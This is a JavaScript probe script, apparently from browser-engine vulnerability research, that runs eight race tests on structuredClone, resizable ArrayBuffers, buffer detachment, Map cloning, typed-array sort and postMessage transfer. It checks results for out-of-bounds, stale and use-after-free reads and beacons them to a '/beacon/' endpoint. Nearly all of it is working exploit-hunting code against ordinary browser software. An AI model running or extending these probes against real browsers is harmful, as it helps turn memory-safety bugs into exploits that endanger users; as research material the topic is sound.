/* p85-toctou — Deep TOCTOU investigation
 *
 * T1 gave TypeError (not DataCloneError) on reversed-order detach.
 * T4 gave controllable GC spray (50 callbacks, 2ms, LIFO).
 *
 * Now: reverse T3 (buf first, shrink second) to see if serializer
 * snapshots size before getter fires.
 *
 * Also: deeper T1 investigation — what state remains after TypeError?
 * And: property order manipulation via integer vs string key ordering.
 *
 * Beacon prefix: V85T-
 */
(function(){
"use strict";
var RUN_ID = "v85t" + Math.random().toString(36).slice(2,12);
var PREFIX = "V85T-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press85-toctou-deep");

/* ====== R1: RAB buf first, shrink second ====== */
function test_R1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

    var shrunk = false;
    var obj = {};

    // buf FIRST — serializer should encounter this first
    obj.buf = rab;

    // shrink SECOND — fires after buf is (hopefully) already size-snapshotted
    Object.defineProperty(obj, 'zzz_shrink', {
      enumerable: true,
      get: function() {
        if (!shrunk) {
          shrunk = true;
          rab.resize(64);
        }
        return "shrunk";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.shrunk = shrunk;
      r.origNow = rab.byteLength;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte63 = cv.length > 63 ? cv[63] : -1;
        if (cv.length > 100) {
          r.byte100 = cv[100];
          r.byte1000 = cv.length > 1000 ? cv[1000] : -1;
          r.byte4000 = cv.length > 4000 ? cv[4000] : -1;
        }
        // SUCCESS if cloned has 4096 bytes but rab is now 64
        r.SIZE_MISMATCH = cloned.buf.byteLength !== rab.byteLength;
        r.OOB_READ = cloned.buf.byteLength > 64;
        // Check if bytes past 64 are original data or zeroed
        if (cv.length > 64) {
          var nonZero = 0;
          for (var j = 64; j < cv.length; j++) {
            if (cv[j] !== 0) nonZero++;
          }
          r.nonZeroPast64 = nonZero;
          r.STALE_READ = nonZero > 0;
        }
      }
      r.zzzVal = cloned.zzz_shrink;
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
      r.shrunk = shrunk;
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R1-BUF-SHRINK", r);
}

/* ====== R2: Same but with detach instead of shrink ====== */
function test_R2() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xEE;

    var detached = false;
    var obj = {};

    // buf FIRST
    obj.buf = ab;

    // detach SECOND
    Object.defineProperty(obj, 'zzz_detach', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
        }
        return "detached";
      }
    });

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.origDetached = ab.byteLength === 0;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte2000 = cv.length > 2000 ? cv[2000] : -1;
        r.CLONED_OK = cloned.buf.byteLength === 4096 && cv[0] === 0xEE;
      }
      r.zzzVal = cloned.zzz_detach;
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
      r.detached = detached;
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R2-BUF-DETACH", r);
}

/* ====== R3: T1 deep dive — examine state after TypeError ====== */
function test_R3() {
  var r = {};
  try {
    var ab = new ArrayBuffer(2048);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 2048; i++) u8[i] = 0xFF;

    var detached = false;
    var getterCalls = 0;
    var obj = {};

    // trigger FIRST (fires, detaches ab)
    Object.defineProperty(obj, 'aaa_trigger', {
      enumerable: true,
      get: function() {
        getterCalls++;
        if (!detached) {
          detached = true;
          try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
        }
        return "triggered";
      }
    });

    // buf SECOND (detached by the time serializer reaches it)
    obj.buf = ab;

    // Catch the error and check what happened
    try {
      var cloned = structuredClone(obj);
      // If we get here, clone SUCCEEDED on detached buffer!
      r.CLONE_SUCCEEDED = true;
      r.detached = detached;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        // CRITICAL: if buf is cloned from detached memory → UAF read
        r.FREED_READ = true;
      }
    } catch(e) {
      r.CLONE_SUCCEEDED = false;
      r.errType = e.name;
      r.errMsg = e.message.slice(0,80);
      r.detached = detached;
      r.getterCalls = getterCalls;

      // After the error, check: is the original buffer detached?
      r.origByteLen = ab.byteLength;
      r.origDetached = ab.byteLength === 0;

      // Can we still use the detached buffer's typed array?
      try {
        var val = u8[0];
        r.u8After = val;
        r.u8Readable = true;
      } catch(e2) {
        r.u8Readable = false;
      }
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R3-T1-DEEP", r);
}

/* ====== R4: Multiple buffers — detach one during clone of object with many ====== */
function test_R4() {
  var r = {};
  try {
    // Object with 5 buffers, getter between buf2 and buf3 detaches buf3
    var bufs = [];
    for (var i = 0; i < 5; i++) {
      bufs[i] = new ArrayBuffer(512);
      new Uint8Array(bufs[i]).fill(0x10 + i); // 0x10, 0x11, 0x12, 0x13, 0x14
    }

    var obj = {};
    obj.b0 = bufs[0];
    obj.b1 = bufs[1];

    // Getter after b1 detaches b3
    Object.defineProperty(obj, 'b2_getter', {
      enumerable: true,
      get: function() {
        // Detach b3 (which hasn't been serialized yet)
        try { structuredClone(bufs[3], { transfer: [bufs[3]] }); } catch(e) {}
        return bufs[2]; // return b2 normally
      }
    });

    obj.b3 = bufs[3]; // this one gets detached by b2_getter
    obj.b4 = bufs[4];

    try {
      var cloned = structuredClone(obj);
      r.b0Len = cloned.b0 instanceof ArrayBuffer ? cloned.b0.byteLength : -1;
      r.b1Len = cloned.b1 instanceof ArrayBuffer ? cloned.b1.byteLength : -1;
      r.b2Len = cloned.b2_getter instanceof ArrayBuffer ? cloned.b2_getter.byteLength : -1;
      r.b3Len = cloned.b3 instanceof ArrayBuffer ? cloned.b3.byteLength : -1;
      r.b4Len = cloned.b4 instanceof ArrayBuffer ? cloned.b4.byteLength : -1;

      // Check b3 — was it cloned despite being detached?
      if (cloned.b3 instanceof ArrayBuffer && cloned.b3.byteLength > 0) {
        var cv3 = new Uint8Array(cloned.b3);
        r.b3Byte0 = cv3[0];
        r.B3_FREED_READ = cv3[0] === 0x13 || cv3[0] !== 0; // original or freed data
      }

      r.origB3Detached = bufs[3].byteLength === 0;
      r.CLONE_OK = true;
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
      r.origB3Detached = bufs[3].byteLength === 0;
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R4-MULTI-BUF", r);
}

/* ====== R5: Map/Set with detaching iterator ====== */
function test_R5() {
  var r = {};
  try {
    var ab = new ArrayBuffer(1024);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 1024; i++) u8[i] = 0xCC;

    // Create a Map where iterating it detaches the buffer
    var map = new Map();
    map.set('key1', 'value1');
    map.set('buf', ab);
    map.set('key2', 'value2');

    // Override Map iterator to detach buffer mid-iteration
    var origIter = Map.prototype[Symbol.iterator];
    var iterCalls = 0;

    // Can't override Map iterator for structuredClone since it
    // uses internal [[MapData]], not the iterator protocol.
    // Instead, try with a plain object + Map reference

    // Actually test: structuredClone(map) — does it use internal slots or iterator?
    try {
      var cloned = structuredClone(map);
      r.clonedSize = cloned.size;
      r.hasBuf = cloned.has('buf');
      if (cloned.get('buf') instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.get('buf').byteLength;
        var cv = new Uint8Array(cloned.get('buf'));
        r.byte0 = cv[0];
      }
      r.MAP_OK = true;
    } catch(e) {
      r.mapErr = e.message.slice(0,60);
    }

    // Now: structuredClone an object with a getter that modifies the map
    var obj2 = {};
    Object.defineProperty(obj2, 'trigger', {
      enumerable: true,
      get: function() {
        // Detach the buffer that's also in the map
        try { structuredClone(ab, { transfer: [ab] }); } catch(e) {}
        return 1;
      }
    });
    obj2.theMap = map;

    try {
      var cloned2 = structuredClone(obj2);
      r.withTrigger = true;
      if (cloned2.theMap instanceof Map) {
        r.map2Size = cloned2.theMap.size;
        var mapBuf = cloned2.theMap.get('buf');
        if (mapBuf instanceof ArrayBuffer) {
          r.map2BufLen = mapBuf.byteLength;
          r.MAP_DETACH_RACE = mapBuf.byteLength > 0;
        }
      }
    } catch(e) {
      r.trigger_err = e.name + ":" + e.message.slice(0,60);
      r.abDetached = ab.byteLength === 0;
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R5-MAP-DETACH", r);
}

/* ====== R6: RAB resize via valueOf during comparison ====== */
function test_R6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var f64 = new Float64Array(rab);
    for (var i = 0; i < f64.length; i++) f64[i] = i + 0.5;

    // Create object with valueOf that resizes RAB during sort comparison
    var resizeCount = 0;
    var evil = {
      valueOf: function() {
        resizeCount++;
        if (resizeCount === 3) {
          rab.resize(64); // shrink during sort!
        }
        return 0;
      }
    };

    // Use sort with evil comparator
    var sortArr = new Float64Array(rab);
    try {
      sortArr.sort(function(a, b) {
        resizeCount++;
        if (resizeCount === 50) {
          rab.resize(64); // shrink during sort!
        }
        return a - b;
      });
      r.sortOK = true;
      r.resizeCount = resizeCount;
      r.rabSize = rab.byteLength;
      r.sortLen = sortArr.length;
      r.sortBufLen = sortArr.buffer.byteLength;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,40);
      r.resizeCount = resizeCount;
      r.rabSize = rab.byteLength;
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R6-SORT-RESIZE", r);
}

/* ====== R7: postMessage transfer race ====== */
function test_R7() {
  var r = {};
  try {
    // MessageChannel — transfer buffer in one port, try to use in clone simultaneously
    var mc = new MessageChannel();
    var ab = new ArrayBuffer(2048);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 2048; i++) u8[i] = 0xAB;

    var received = false;
    mc.port2.onmessage = function(e) {
      received = true;
      if (e.data instanceof ArrayBuffer) {
        r.receivedLen = e.data.byteLength;
        var rv = new Uint8Array(e.data);
        r.receivedByte0 = rv[0];
      }
    };

    // Transfer the buffer
    mc.port1.postMessage(ab, [ab]);
    r.afterTransfer = ab.byteLength; // should be 0 (detached)

    // Try to clone the detached buffer immediately
    try {
      var cloned = structuredClone(ab);
      r.CLONE_AFTER_TRANSFER = true;
      r.clonedLen = cloned.byteLength;
    } catch(e) {
      r.cloneErr = e.name;
    }

    setTimeout(function() {
      r.received = received;
      mc.port1.close();
      mc.port2.close();
      B("R7-TRANSFER-RACE", r);
    }, 200);

  } catch(e) { r.outerErr = e.message.slice(0,80); B("R7-TRANSFER-RACE", r); }
}

/* ====== R8: structuredClone with circular ref + detach ====== */
function test_R8() {
  var r = {};
  try {
    var ab = new ArrayBuffer(1024);
    new Uint8Array(ab).fill(0x99);

    // Create circular object reference
    var obj = {};
    obj.self = obj; // circular!
    obj.buf = ab;

    // Does structuredClone handle circular refs?
    try {
      var cloned = structuredClone(obj);
      r.circular = cloned.self === cloned; // should be true (same ref in clone)
      if (cloned.buf instanceof ArrayBuffer) {
        r.bufLen = cloned.buf.byteLength;
        r.byte0 = new Uint8Array(cloned.buf)[0];
      }
      r.CIRCULAR_OK = true;
    } catch(e) {
      r.circErr = e.name + ":" + e.message.slice(0,40);
    }

    // Now: circular + detach race
    var ab2 = new ArrayBuffer(1024);
    new Uint8Array(ab2).fill(0x77);

    var obj2 = {};
    obj2.self = obj2;
    Object.defineProperty(obj2, 'trigger', {
      enumerable: true,
      get: function() {
        try { structuredClone(ab2, { transfer: [ab2] }); } catch(e) {}
        return 1;
      }
    });
    obj2.buf = ab2;

    try {
      var cloned2 = structuredClone(obj2);
      r.circ2 = cloned2.self === cloned2;
      if (cloned2.buf instanceof ArrayBuffer) {
        r.buf2Len = cloned2.buf.byteLength;
        r.buf2Byte0 = new Uint8Array(cloned2.buf)[0];
        r.CIRC_DETACH_OK = true;
      }
    } catch(e) {
      r.circ2Err = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("R8-CIRCULAR", r);
}

/* ====== Run ====== */
try {
  test_R1();
  setTimeout(test_R2, 300);
  setTimeout(test_R3, 600);
  setTimeout(test_R4, 900);
  setTimeout(test_R5, 1200);
  setTimeout(test_R6, 1500);
  setTimeout(test_R7, 1800);
  setTimeout(test_R8, 2200);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe85-done"); }, 22000);
})();
